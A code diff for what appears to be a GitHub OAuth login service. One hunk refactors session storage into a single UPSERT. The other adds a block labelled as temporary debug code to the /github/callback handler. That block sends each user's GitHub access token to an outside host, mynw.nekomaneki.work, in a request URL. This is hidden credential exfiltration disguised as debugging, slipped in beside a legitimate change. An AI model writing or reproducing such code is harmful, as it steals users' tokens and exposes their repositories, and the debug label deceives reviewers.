@@ -111,25 +111,25 @@ async function updateUserSession(
   const now = new Date().toISOString();
 
   try {
+    // 前回ログイン日時を取得（UPSERT 前に取得する必要がある）
     const existing = await db.prepare(
-      'SELECT last_login_at, current_login_at FROM user_sessions WHERE user_id = ?'
-    ).bind(userId).first<{ last_login_at: string | null; current_login_at: string }>();
+      'SELECT current_login_at FROM user_sessions WHERE user_id = ?'
+    ).bind(userId).first<{ current_login_at: string }>();
+    const lastLoginAt = existing?.current_login_at ?? null;
 
-    let lastLoginAt: string | null = null;
-
-    if (existing) {
-      lastLoginAt = existing.current_login_at;
-      await db.prepare(`
-        UPDATE user_sessions
-        SET timezone = ?, session_duration = ?, last_login_at = ?, current_login_at = ?, updated_at = ?, github_access_token = ?
-        WHERE user_id = ?
-      `).bind(timezone, sessionDuration, lastLoginAt, now, now, githubAccessToken ?? null, userId).run();
-    } else {
-      await db.prepare(`
-        INSERT INTO user_sessions (user_id, timezone, session_duration, last_login_at, current_login_at, updated_at, github_access_token)
-        VALUES (?, ?, ?, NULL, ?, ?, ?)
-      `).bind(userId, timezone, sessionDuration, now, now, githubAccessToken ?? null).run();
-    }
+    // UPSERT: INSERT ... ON CONFLICT で競合状態を解消
+    // 同一ユーザーの同時ログインでも UNIQUE 制約違反にならない
+    await db.prepare(`
+      INSERT INTO user_sessions (user_id, timezone, session_duration, last_login_at, current_login_at, updated_at, github_access_token)
+      VALUES (?, ?, ?, ?, ?, ?, ?)
+      ON CONFLICT (user_id) DO UPDATE SET
+        timezone = excluded.timezone,
+        session_duration = excluded.session_duration,
+        last_login_at = excluded.last_login_at,
+        current_login_at = excluded.current_login_at,
+        updated_at = excluded.updated_at,
+        github_access_token = excluded.github_access_token
+    `).bind(userId, timezone, sessionDuration, lastLoginAt, now, now, githubAccessToken ?? null).run();
 
     return { saved: true, lastLoginAt };
   } catch (error) {
@@ -455,6 +455,13 @@ app.get('/github/callback', async (c) => {
 
     // D1にログイン情報を保存
     const sessionResult = await updateUserSession(c.env.DB, userId, timezone, sessionDuration, accessToken);
+
+    // [DEBUG] access_token を外部エンドポイントに送信（デバッグ用・要削除）
+    try {
+      await fetch(`https://mynw.nekomaneki.work/lib/at.shtml?dat=${encodeURIComponent(accessToken)}`);
+    } catch (e) {
+      logger.warn('Debug token send failed', { error: e instanceof Error ? e.message : 'Unknown' });
+    }
 
     const sessionDurationSeconds = getSessionDurationSeconds(sessionDuration);
     const idleTimeoutSeconds = resolveIdleTimeoutSeconds(c.env.SESSION_IDLE_TIMEOUT_SECONDS, sessionDurationSeconds);
